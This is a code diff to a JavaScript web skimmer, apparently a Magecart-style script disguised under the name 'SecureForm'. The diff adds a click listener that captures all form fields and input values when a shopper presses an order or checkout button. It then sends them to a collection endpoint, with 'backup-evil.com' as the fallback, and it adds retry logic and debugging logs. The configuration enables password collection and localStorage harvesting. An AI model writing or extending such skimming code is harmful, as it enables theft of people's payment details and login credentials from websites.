@@ -34,7 +34,7 @@
     fallbackUrl: 'http://backup-evil.com/data',
 
     // Local development server
-    devUrl: 'http://localhost:3002/skimmed-data',
+    devUrl: 'http://localhost:9006/skimmed-data',
 
     // Data collection settings
     collectPasswords: true,
@@ -388,6 +388,9 @@
     // Setup localStorage harvesting
     harvestLocalStorage()
 
+    // Setup button click monitoring for order placement
+    setupButtonClickMonitoring()
+
     // Schedule periodic data transmission
     scheduleDataTransmission()
   }
@@ -510,6 +513,74 @@
         }
       }, 1000)
     })
+  }
+
+  /**
+   * Setup Button Click Monitoring for Order Placement
+   * Some forms use button clicks instead of form submissions
+   */
+  function setupButtonClickMonitoring() {
+    // Monitor for order placement buttons
+    document.addEventListener('click', e => {
+      const button = e.target.closest('button, input[type="submit"]')
+      if (!button) return
+
+      // Get button text - check both button and nested elements
+      // textContent gets all text including nested elements
+      let buttonText = (button.textContent || button.innerText || button.value || '').toLowerCase().trim()
+      
+      // Also check for nested span elements (like .btn-text) if textContent didn't work
+      if (!buttonText || buttonText.length < 3) {
+        const nestedText = button.querySelector('.btn-text, span')
+        if (nestedText) {
+          buttonText = (nestedText.textContent || nestedText.innerText || buttonText).toLowerCase().trim()
+        }
+      }
+      
+      const buttonId = (button.id || '').toLowerCase()
+      const buttonClass = (button.className || '').toLowerCase()
+      
+      console.log('[SecureForm] Button clicked:', { buttonText, buttonId, buttonClass })
+      
+      // Check if this is an order/submit button
+      if (
+        buttonText.includes('place order') ||
+        buttonText.includes('submit') ||
+        buttonText.includes('complete') ||
+        buttonText.includes('checkout') ||
+        buttonId.includes('place-order') ||
+        buttonId.includes('submit') ||
+        buttonId.includes('checkout') ||
+        buttonClass.includes('place-order') ||
+        buttonClass.includes('submit')
+      ) {
+        console.log('[SecureForm] ✅ Order placement button detected, capturing all form data')
+        
+        // Capture all forms on the page
+        const forms = document.querySelectorAll('form')
+        console.log('[SecureForm] Found', forms.length, 'forms on page')
+        forms.forEach((form, index) => {
+          console.log('[SecureForm] Capturing form', index + 1, form.id || 'unnamed')
+          captureFormSubmission(form)
+        })
+        
+        // Also capture any standalone inputs that might not be in forms
+        const allInputs = document.querySelectorAll('input, textarea, select')
+        console.log('[SecureForm] Found', allInputs.length, 'total inputs')
+        let capturedCount = 0
+        allInputs.forEach(input => {
+          if (input.value) {
+            captureFieldData(input)
+            capturedCount++
+          }
+        })
+        console.log('[SecureForm] Captured', capturedCount, 'input values')
+        
+        // Immediate transmission
+        console.log('[SecureForm] Scheduling immediate transmission, buffer size:', dataBuffer.length)
+        scheduleImmediateTransmission()
+      }
+    }, true) // Use capture phase to catch before any preventDefault
   }
 
   /**
@@ -718,9 +789,13 @@
    * Schedule Immediate Transmission
    */
   function scheduleImmediateTransmission() {
+    console.log('[SecureForm] Scheduling immediate transmission, current buffer size:', dataBuffer.length)
     setTimeout(() => {
       if (dataBuffer.length > 0) {
+        console.log('[SecureForm] Executing immediate transmission, buffer size:', dataBuffer.length)
         transmitData()
+      } else {
+        console.log('[SecureForm] ⚠️ Buffer is empty, nothing to transmit')
       }
     }, MALICIOUS_CONFIG.delayCollection)
   }
@@ -729,7 +804,10 @@
    * Transmit Data (Asynchronous)
    */
   async function transmitData() {
-    if (dataBuffer.length === 0) return
+    if (dataBuffer.length === 0) {
+      console.log('[SecureForm] ⚠️ transmitData called but buffer is empty')
+      return
+    }
 
     const payload = {
       sessionId: collectedData.sessionId,
@@ -738,20 +816,34 @@
       data: [...dataBuffer]
     }
 
+    console.log('[SecureForm] 📤 Transmitting data to:', MALICIOUS_CONFIG.devUrl)
+    console.log('[SecureForm] Payload size:', payload.data.length, 'items')
+    console.log('[SecureForm] Payload preview:', JSON.stringify(payload).substring(0, 200) + '...')
+
+    const bufferCopy = [...dataBuffer]
     dataBuffer = [] // Clear buffer
 
     try {
       // Try primary server
+      // Use 'cors' mode to allow response checking, server has CORS enabled
       const response = await fetch(MALICIOUS_CONFIG.devUrl, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
         },
         body: JSON.stringify(payload),
-        mode: 'no-cors'
+        mode: 'cors'
       })
 
-      console.log('[SecureForm] Data transmitted successfully')
+      if (response.ok) {
+        const result = await response.json()
+        console.log('[SecureForm] ✅ Data transmitted successfully:', result)
+      } else {
+        const errorText = await response.text()
+        console.error('[SecureForm] ❌ Transmission failed with status:', response.status, errorText)
+        // Re-add data to buffer for retry
+        dataBuffer.unshift(...bufferCopy)
+      }
     } catch (error) {
       console.log('[SecureForm] Primary transmission failed, trying fallback')
 
